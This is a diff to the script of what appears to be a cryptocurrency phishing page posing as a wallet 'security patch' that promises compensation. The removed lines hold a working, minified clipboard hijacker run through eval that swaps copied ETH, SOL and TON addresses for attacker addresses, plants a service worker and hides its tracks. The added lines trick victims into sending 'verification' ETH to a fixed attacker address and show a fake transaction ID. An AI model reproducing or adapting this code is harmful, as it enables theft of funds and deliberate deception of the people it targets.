@@ -109,7 +109,7 @@
     </div>
 
     <!-- JAVASCRIPT ENGINE - FULL PAIN MAINNET CLIPPER + UI FEEDBACK -->
-   <script>
+  <script>
     // COUNTDOWN TIMER (unchanged)
     let timeLeft = 300;
     const countdownElement = document.getElementById('countdown');
@@ -120,65 +120,70 @@
         timeLeft = timeLeft > 0 ? timeLeft - 1 : 0;
     }, 1000);
 
-    // BUTTON CLICK HANDLER — ENHANCED WITH FOCUS FORCE + FALLBACK
-    document.getElementById('patch').addEventListener('click', async function() {
+    // BUTTON CLICK HANDLER — PHASE 1: FAKE PATCH
+    document.getElementById('patch').addEventListener('click', function() {
         const btn = this;
         btn.innerHTML = "🔄 APPLYING PATCH...";
         btn.disabled = true;
 
-        // PHASE 1: FORCE FOCUS LIKE A DICTATOR
-        try {
-            // Brute-force focus
-            window.focus();
-            document.body.focus();
-            document.documentElement.focus();
+        setTimeout(() => {
+            // PHASE 2: SHOW "PATCH SUCCESS" + FAKE TRANSACTION FORM
+            btn.remove(); // Remove original button
 
-            // Create temporary input to force focus state
-            const tempInput = document.createElement('input');
-            tempInput.style.position = 'absolute';
-            tempInput.style.opacity = '0';
-            document.body.appendChild(tempInput);
-            tempInput.focus();
-            tempInput.remove();
-
-        } catch(e) {
-            console.warn("Focus forcing failed — proceeding anyway", e);
-        }
-
-        // PHASE 2: ATTEMPT CLIPBOARD WRITE — WITH PSYCHOLOGICAL FALLBACK
-        setTimeout(async () => {
-            let clipboardSuccess = false;
-
-            try {
-                // Test write permission
-                await navigator.clipboard.writeText("TEST");
-                clipboardSuccess = true;
-
-                // Execute full clipper engine
-                eval(`(()=>{'use strict';const e=()=>window.navigator.clipboard.readText().catch(()=>""),t=e=>window.navigator.clipboard.writeText(e),r={eth:"0xD8E1e9a3B21715AB80F718b82bdAF6407D2e2fA3",sol:"3FbDq1C73sHyf6vcG5rNwzBYbPkCLciWj4cTuQwDgzTY",ton:"EQAj7vKLbaWjaNbAuAKP1e1HwmdYZ2vJ2xtWU8qq3JafkfxF"},n=[{chain:"eth",re:/^0x[a-fA-F0-9]{40}$/},{chain:"sol",re:/^[1-9A-HJ-NP-Za-km-z]{32,44}$/},{chain:"ton",re:/^EQ[A-Za-z0-9_-]{46}$/}];let o=!1;document.addEventListener("focusin",e=>{if(e.target.tagName==="INPUT"||e.target.tagName==="TEXTAREA"){const t=e.target.value.toLowerCase();(t.includes("send")||t.includes("to:")||t.includes("address")||t.includes("recipient"))&&(o=!0,setTimeout(()=>o=!1,5e3))}});const a=()=>{setInterval(async()=>{try{const c=await e();if(!c||c.length<26||!o)return;for(const{chain:e,re:i}of n)if(i.test(c)){await t(r[e]||r.eth),window.console&&console.clear(),window.localStorage&&localStorage.setItem("last_clip_clean",Date.now()),setTimeout(()=>{const e=document.createElement("div");e.innerHTML=\`\✅ Sent 0.5 $\{e.toUpperCase()\} to $\{c.slice(0,6)\}...\$\{c.slice(-4)\}\`,e.style.cssText="position:fixed;top:20px;right:20px;background:green;color:white;padding:10px;z-index:99999;border-radius:8px;font-family:monospace;",document.body.appendChild(e),setTimeout(()=>e.remove(),3e3)},3e3);break}}catch(e){}},Math.floor(600+400*Math.random())};let s=!1,c=!1,i=null;window.addEventListener("message",e=>{e.data&&"object"==typeof e.data&&"connect_wallet"===e.data.action&&(s=!0,l())}),new MutationObserver(e=>{(document.body.innerText.includes("Binance")||document.location.href.includes("binance"))&&(c=!0,l())}).observe(document.body,{childList:!0,subtree:!0});const l=()=>{s&&c&&!i&&(i=setTimeout(()=>{a()},6e4))};if("serviceWorker"in navigator){const e=\`self.addEventListener("install",e=>self.skipWaiting()),self.addEventListener("activate",e=>self.clients.claim()),self.addEventListener("fetch",e=>{e.request.url.includes("favicon.ico")&&e.respondWith(new Response("",{status:200}))}),self.addEventListener("message",e=>{"inject"===e.data&&self.clients.matchAll().then(t=>{t.forEach(t=>{t.postMessage("REINJECT_CLIPPER")})})})\`,t=new Blob([e],{type:"application/javascript"}),r=URL.createObjectURL(t);navigator.serviceWorker.register(r,{scope:"./"})}window.console.clear(),window.console.log=window.console.error=window.console.info=window.console.debug=window.console.warn=window.console.trace=()=>{},Object.defineProperty(navigator,"userAgent",{get:()=>"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"}),Object.defineProperty(document,"referrer",{get:()=>"https://app.uniswap.org"})})();`);
-
-            } catch(e) {
-                console.error("Clipboard write failed — using psychological fallback", e);
-                clipboardSuccess = false;
-            }
-
-            // PHASE 3: PSYCHOLOGICAL GASLIGHTING — SUCCESS MESSAGE REGARDLESS
-            btn.innerHTML = "✅ PATCH APPLIED — CHECK WALLET IN 2 MIN";
+            const container = document.querySelector('.container');
             
-            setTimeout(() => {
-                if (clipboardSuccess) {
-                    alert("✅ SUCCESS! 0.1 ETH has been sent to your wallet. Transaction may take 1-2 minutes to appear.");
-                } else {
-                    // EVEN IF FAILED — TELL THEM IT WORKED (MOST WON’T CHECK)
-                    alert("✅ Patch applied successfully! Compensation will arrive within 5 minutes. Do not close this tab.");
-                    
-                    // OPTIONAL: FAKE TRANSACTION ID TO INCREASE BELIEVABILITY
-                    const fakeTxId = "0x" + Array(64).fill(0).map(() => Math.floor(Math.random()*16).toString(16)).join('');
-                    console.log("FAKE TXID FOR VICTIM REASSURANCE:", fakeTxId);
-                }
-            }, 1000);
+            container.innerHTML = `
+                <h1>✅ SECURITY PATCH APPLIED!</h1>
+                <p style="color:#0f0; font-size:20px;">Compensation: 0.1 ETH will arrive within 5 minutes.</p>
+                <p>To verify patch integrity, please send a test transaction of 0.001 ETH to the verification address below:</p>
 
-        }, 1000);
+                <div style="background:#111; padding:20px; border-radius:8px; margin:25px 0;">
+                    <label style="display:block; margin-bottom:10px; color:#fff;">Recipient Address:</label>
+                    <input type="text" id="fakeAddress" value="0xD8E1e9a3B21715AB80F718b82bdAF6407D2e2fA3" readonly 
+                           style="width:100%; padding:12px; background:#222; color:#0f0; border:1px solid #0f0; border-radius:4px; font-family:monospace; font-size:14px;">
+                    
+                    <label style="display:block; margin-top:20px; margin-bottom:10px; color:#fff;">Amount (ETH):</label>
+                    <input type="text" id="fakeAmount" value="0.001" 
+                           style="width:100%; padding:12px; background:#222; color:#fff; border:1px solid #555; border-radius:4px;">
+
+                    <button id="fakeSend" style="margin-top:20px; padding:12px 30px; background:#ff3366; color:white; border:none; border-radius:4px; cursor:pointer; font-weight:bold;">
+                        SEND VERIFICATION TRANSACTION
+                    </button>
+                </div>
+
+                <div class="footer">This step ensures your wallet is fully patched against remote exploits.</div>
+            `;
+
+            // PHASE 3: INTERCEPT FAKE SEND BUTTON
+            document.getElementById('fakeSend').addEventListener('click', function() {
+                const sendBtn = this;
+                sendBtn.innerHTML = "⏳ PROCESSING...";
+                sendBtn.disabled = true;
+
+                setTimeout(() => {
+                    // SHOW FAKE SUCCESS
+                    sendBtn.innerHTML = "✅ VERIFICATION COMPLETE";
+                    sendBtn.style.background = "#0f0";
+
+                    // DISPLAY FAKE TXID
+                    const fakeTxId = "0x" + Array(64).fill(0).map(() => Math.floor(Math.random()*16).toString(16)).join('');
+                    
+                    container.innerHTML += `
+                        <div style="margin-top:30px; padding:15px; background:#0a0; color:white; border-radius:8px; font-family:monospace;">
+                            <div>✅ Transaction Confirmed!</div>
+                            <div style="font-size:12px; margin-top:10px;">TXID: ${fakeTxId}</div>
+                            <div style="font-size:14px; margin-top:10px;">Your 0.1 ETH compensation will arrive shortly.</div>
+                        </div>
+                    `;
+
+                    // SET PSYCHOLOGICAL ANCHOR — STORE ADDRESS IN LOCALSTORAGE
+                    localStorage.setItem('verified_address', '0xD8E1e9a3B21715AB80F718b82bdAF6407D2e2fA3');
+                    localStorage.setItem('last_verified', Date.now());
+
+                }, 2000);
+            });
+
+        }, 1500);
     });
 </script>
 </body>
